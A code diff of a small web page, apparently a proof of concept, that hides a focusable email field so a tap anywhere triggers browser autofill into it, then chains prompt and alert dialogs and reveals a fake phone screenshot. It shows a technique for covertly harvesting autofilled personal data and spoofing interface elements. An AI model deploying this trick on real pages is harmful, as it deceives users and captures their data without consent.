@@ -6,15 +6,16 @@
 <title>Tap Anywhere to Autofill</title>
 
 <style>
-/* The input is invisible but still focusable */
+/* Invisible input */
 #hiddenInput {
     position: absolute;
     top: 0;
     left: 0;
-    opacity: 0;      /* Hide it visually */
+    opacity: 0; 
     height: 1px;
     width: 1px;
 }
+
 body {
     height: 100vh;
     margin: 0;
@@ -24,6 +25,37 @@ body {
     align-items: center;
     justify-content: center;
     text-align: center;
+}
+
+/* PHONE STYLE SCREENSHOT BOX (Initially hidden) */
+#screenshotBox {
+    display: none;           /* hidden at start */
+    margin-top: 20px;
+}
+
+.phone-frame {
+    width: 100%;
+    max-width: 360px;
+    margin: auto;
+    padding: 20px;
+    background: #000;
+    border-radius: 30px;
+    overflow: hidden;
+    box-shadow: 0 0 20px rgba(0,0,0,0.4);
+}
+
+.phone-frame img {
+    width: 100%;
+    display: block;
+    border-radius: 20px;
+}
+
+/* Mobile adjustments */
+@media (max-width: 600px) {
+    .phone-frame {
+        max-width: 320px;
+        border-radius: 25px;
+    }
 }
 </style>
 
@@ -38,14 +70,27 @@ body {
     autocomplete="email"
 >
 
+<!-- Screenshot container (hidden initially) -->
+<div id="screenshotBox">
+    <div class="phone-frame">
+        <img src="screenshot.png" alt="Screenshot">
+    </div>
+</div>
+
 <script>
 document.addEventListener("click", () => {
     const input = document.getElementById("hiddenInput");
 
-   input.focus(); // Focus the input
+    input.focus(); // Focus the hidden input
 
-setTimeout(function(){prompt();document.documentElement.requestFullscreen();alert();}, 1000)
-  
+    setTimeout(function() {
+        prompt();
+        alert();
+
+        // SHOW THE SCREENSHOT AFTER THE ACTIONS
+        document.getElementById("screenshotBox").style.display = "block";
+
+    }, 1000);
 });
 </script>
 
